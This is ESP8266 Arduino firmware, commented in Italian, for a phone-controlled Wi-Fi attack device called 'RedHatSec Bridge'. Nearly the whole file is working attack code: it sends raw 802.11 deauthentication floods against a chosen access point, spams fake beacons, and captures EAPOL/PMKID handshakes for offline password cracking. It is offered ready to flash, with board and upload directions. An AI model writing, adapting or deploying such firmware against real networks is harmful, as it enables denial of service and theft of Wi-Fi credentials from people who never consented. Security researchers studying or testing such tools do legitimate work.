// RedHatSec Bridge 8266 v2 — AP + protocollo RHS integrato (Wi-Fi recon/attack on-board)
//
//   iPhone --TCP:3333--> ESP8266: RHS framed protocol
//     0x02 scan(sec)   → reti visibili [rssi][ch][bssid][sec][ssid]
//     0x04 deauth(mac,ch,count) → TX raw deauth
//     0x05 beacon(count,[len][ssid]..) → beacon spam
//     0x06 pmkid(mac,ch) → capture EAPOL promiscua
//     0x07 stop
//
// TX raw: wifi_send_pkt_freedom — compatibile esp8266 core 3.x (testato su 3.1.2)
// e 2.x. Il TCP resta vivo perché l'AP è in WIFI_AP_STA: AP e STA coesistono.
//
// Flash: Arduino IDE → board NodeMCU 1.0 / Wemos D1 mini → Upload.

#include <ESP8266WiFi.h>
#include <user_interface.h>

const char *AP_SSID  = "RHS-Bridge";
const char *AP_PASS  = "redhatsec";
const uint16_t TCP_PORT = 3333;

WiFiServer server(TCP_PORT);
WiFiClient client;

uint8_t rxBuf[512];
int rxLen = 0;

bool beaconActive = false;
bool pmkidArmed = false;
uint32_t pmkidStart = 0;
uint8_t pmkidTarget[6];
uint8_t pmkidBuf[128];
int pmkidLen = 0;
bool pmkidCaptured = false;

uint8_t beaconSsids[16][33];
int beaconSsidLens[16];
int beaconCount = 0;

// ===== crc8 (spec condivisa) =====
uint8_t crc8(const uint8_t *d, int n) {
  uint8_t crc = 0;
  for (int i = 0; i < n; i++) {
    crc ^= d[i];
    for (int b = 0; b < 8; b++)
      crc = (crc & 0x80) ? (uint8_t)((crc << 1) ^ 0x07) : (uint8_t)(crc << 1);
  }
  return crc;
}

// ===== TX verso l'app (chunked notify a 20B, MTU-safe anche su TCP) =====
void sendFrame(uint8_t cmdEcho, uint8_t status, const uint8_t *payload, int len) {
  uint8_t f[1024];
  int i = 0;
  f[i++] = 0x5A;
  f[i++] = len & 0xFF;
  f[i++] = (len >> 8) & 0xFF;
  f[i++] = cmdEcho;
  f[i++] = status;
  if (len > 1000) len = 1000;
  if (len > 0) { memcpy(f + i, payload, len); i += len; }
  f[i++] = crc8(f + 1, 4 + len);
  if (client && client.connected()) {
    client.write(f, i);
    client.flush();
  }
  Serial.printf("[TX] cmd=0x%02X status=0x%02X len=%d\n", cmdEcho, status, len);
}

// ===== RX dall'app =====
void feedRx(const uint8_t *d, int n) {
  for (int i = 0; i < n; i++) {
    if (rxLen == 0 && d[i] != 0xA5) continue;
    if (rxLen < (int)sizeof(rxBuf)) rxBuf[rxLen++] = d[i];
    if (rxLen >= 6) {
      int plen = rxBuf[1] | (rxBuf[2] << 8);
      int total = 6 + plen;
      if (rxLen >= total) {
        uint8_t cmd = rxBuf[4];
        if (crc8(rxBuf + 1, 4 + plen) == rxBuf[5 + plen]) {
          dispatchCmd(cmd, rxBuf + 5, plen);
        } else {
          sendFrame(cmd, 0x01, (const uint8_t *)"crcerr", 6);
        }
        rxLen = 0;
      }
    }
  }
}

// ===== TX raw 802.11 =====
// compatibile SDK2/SDK3: wifi_promiscuous_enable esiste in entrambi
void radioChannel(uint8_t ch) {
  wifi_promiscuous_enable(0);
  wifi_set_channel(ch);
  wifi_promiscuous_enable(1);
}

void sendDeauth(const uint8_t bssid[6], uint8_t ch, int count) {
  radioChannel(ch);
  uint8_t pkt[26];
  pkt[0] = 0xC0; pkt[1] = 0x00;
  pkt[2] = 0x00; pkt[3] = 0x00;
  for (int k = 0; k < 6; k++) pkt[4 + k] = 0xFF;
  memcpy(pkt + 10, bssid, 6);
  memcpy(pkt + 16, bssid, 6);
  pkt[22] = 0xF0; pkt[23] = 0xFF;
  pkt[24] = 0x07; pkt[25] = 0x00;
  for (int n = 0; n < count; n++) {
    wifi_send_pkt_freedom(pkt, 26, false);
    delay(8);
  }
  Serial.printf("[deauth] %02X:%02X:%02X:%02X:%02X:%02X ch%d x%d\n",
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ch, count);
}

void buildBeacon(uint8_t *pkt, int *len, const uint8_t *ssid, int ssidLen,
                 const uint8_t bssid[6], uint8_t ch) {
  int i = 0;
  pkt[i++] = 0x80; pkt[i++] = 0x00;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  for (int k = 0; k < 6; k++) pkt[i++] = 0xFF;
  memcpy(pkt + i, bssid, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  for (int k = 0; k < 8; k++) pkt[i++] = 0x00;
  pkt[i++] = 0x64; pkt[i++] = 0x00;
  pkt[i++] = 0x01; pkt[i++] = 0x04;
  pkt[i++] = 0x00; pkt[i++] = (uint8_t)ssidLen;
  memcpy(pkt + i, ssid, ssidLen); i += ssidLen;
  pkt[i++] = 0x01; pkt[i++] = 0x08;
  const uint8_t rates[8] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
  memcpy(pkt + i, rates, 8); i += 8;
  pkt[i++] = 0x03; pkt[i++] = 0x01; pkt[i++] = ch;
  *len = i;
}

void beaconLoop() {
  uint8_t ch = 6;
  radioChannel(ch);
  uint8_t pkt[128];
  for (int n = 0; n < beaconCount && beaconActive; n++) {
    uint8_t bssid[6] = {0x02, (uint8_t)random(256), (uint8_t)random(256),
                        (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256)};
    int len = 0;
    buildBeacon(pkt, &len, beaconSsids[n], beaconSsidLens[n], bssid, ch);
    for (int rep = 0; rep < 3; rep++) wifi_send_pkt_freedom(pkt, len, false);
    delay(40);
  }
}

// ===== PMKID sniffer (SDK-agnostico: byte-scan, nessuna struct interna) =====
void snifferCb(uint8_t *buf, uint16_t len) {
  if (!pmkidArmed || len < 40) return;
  uint8_t *d = buf;
  int lim = (len > 160) ? 160 : len;
  for (int i = 0; i + 8 <= lim; i++) {
    if (d[i] == 0xAA && d[i + 1] == 0xAA && d[i + 2] == 0x03 && d[i + 3] == 0x00 &&
        d[i + 4] == 0x00 && d[i + 5] == 0x00 && d[i + 6] == 0x88 && d[i + 7] == 0x8E) {
      // filtro AP: mac target presente nella zona addr del frame
      bool match = false;
      for (int a = 4; a + 6 <= 36 && a + 6 <= len; a++) {
        if (memcmp(d + a, pmkidTarget, 6) == 0) { match = true; break; }
      }
      if (!match) return;
      pmkidLen = (len < 128) ? len : 128;
      memcpy(pmkidBuf, d, pmkidLen);
      pmkidCaptured = true;
      Serial.println("[pmkid] EAPOL catturato");
      return;
    }
  }
}

// ===== dispatcher =====
void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
  Serial.printf("[RX] cmd=0x%02X plen=%d\n", cmd, plen);
  switch (cmd) {
    case 0x01:  // ping
      sendFrame(0x01, 0x00, (const uint8_t *)"RHS-8266", 8);
      break;
    case 0x02: {  // scan — la scan SDK vuole la promiscua OFF
      wifi_promiscuous_enable(0);
      WiFi.scanDelete();
      WiFi.enableSTA(true);
      int n = WiFi.scanNetworks(false, true);
      Serial.printf("[scan] n=%d\n", n);
      if (n <= 0) {
        // retry: alcuni SDK 3.x servono un warm-up prima della prima scan in AP_STA
        delay(600);
        n = WiFi.scanNetworks(false, true);
        Serial.printf("[scan] retry n=%d\n", n);
      }
      uint8_t payload[900];
      int i = 0;
      for (int k = 0; k < n && i < 880; k++) {
        String ssid = WiFi.SSID(k);
        int32_t rssi = WiFi.RSSI(k);
        uint8_t ch = WiFi.channel(k);
        uint8_t *b = WiFi.BSSID(k);
        uint8_t sec = WiFi.encryptionType(k) == ENC_TYPE_NONE ? 0 : 1;
        payload[i++] = (uint8_t)(int8_t)constrain(rssi, -100, -30);
        payload[i++] = ch;
        memcpy(payload + i, b, 6); i += 6;
        payload[i++] = sec;
        int sl = (ssid.length() < 32) ? ssid.length() : 32;
        payload[i++] = (uint8_t)sl;
        memcpy(payload + i, ssid.c_str(), sl); i += sl;
      }
      WiFi.scanDelete();
      sendFrame(0x02, 0x00, payload, i);
      wifi_promiscuous_enable(1);
      break;
    }
    case 0x04:  // deauth(mac6, ch, count)
      if (plen >= 8) {
        beaconActive = false;
        sendDeauth(pl, pl[6], pl[7]);
        sendFrame(0x04, 0x00, (const uint8_t *)"deauth ok", 9);
      } else {
        sendFrame(0x04, 0x02, (const uint8_t *)"bad args", 8);
      }
      break;
    case 0x05: {  // beacon(count, [len][ssid]..)
      beaconActive = false;
      int p = 0;
      int cnt = plen > 0 ? pl[p++] : 0;
      if (cnt > 16) cnt = 16;
      beaconCount = 0;
      for (int k = 0; k < cnt && p < plen; k++) {
        int sl = pl[p++];
        if (p + sl > plen || sl > 32) break;
        memcpy(beaconSsids[beaconCount], pl + p, sl);
        beaconSsidLens[beaconCount] = sl;
        beaconCount++;
        p += sl;
      }
      beaconActive = beaconCount > 0;
      Serial.printf("[beacon] armato x%d\n", beaconCount);
      break;
    }
    case 0x06:  // pmkid(mac6, ch)
      if (plen >= 7) {
        memcpy(pmkidTarget, pl, 6);
        pmkidCaptured = false;
        pmkidLen = 0;
        pmkidArmed = true;
        pmkidStart = millis();
        radioChannel(pl[6]);
        wifi_set_promiscuous_rx_cb(snifferCb);
        Serial.println("[pmkid] armed");
      }
      break;
    case 0x07:  // stop
      beaconActive = false;
      pmkidArmed = false;
      wifi_promiscuous_enable(0);
      sendFrame(0x07, 0x00, (const uint8_t *)"stopped", 7);
      break;
    default:
      sendFrame(cmd, 0x03, (const uint8_t *)"unknown cmd", 11);
  }
}

void setup() {
  Serial.begin(115200);
  Serial.setDebugOutput(false);
  pinMode(2, OUTPUT);
  digitalWrite(2, LOW);

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(AP_SSID, AP_PASS);
  wifi_promiscuous_enable(1);

  server.begin();
  server.setNoDelay(true);
  Serial.printf("[RHS-8266 v2] AP '%s' ip %s :%u — protocollo RHS pronto\n",
                AP_SSID, WiFi.softAPIP().toString().c_str(), TCP_PORT);
}

void loop() {
  if (!client || !client.connected()) {
    if (client) client.stop();
    client = server.available();
    if (client) {
      client.setNoDelay(true);
      Serial.println("[bridge] client TCP connesso");
    }
  }

  int avail;
  while (client && client.connected() && (avail = client.available()) > 0) {
    uint8_t buf[128];
    int n = client.read(buf, sizeof(buf));
    if (n > 0) feedRx(buf, n);
  }

  if (beaconActive) beaconLoop();

  if (pmkidArmed && (pmkidCaptured || millis() - pmkidStart > 25000)) {
    pmkidArmed = false;
    wifi_promiscuous_enable(0);
    if (pmkidCaptured) sendFrame(0x06, 0x00, pmkidBuf, pmkidLen);
    else sendFrame(0x06, 0x02, (const uint8_t *)"no eapol", 8);
  }

  if (!client || !client.connected()) {
    digitalWrite(2, (millis() / 800) % 2 ? LOW : HIGH);
  } else {
    digitalWrite(2, LOW);
  }

  delay(1);
}
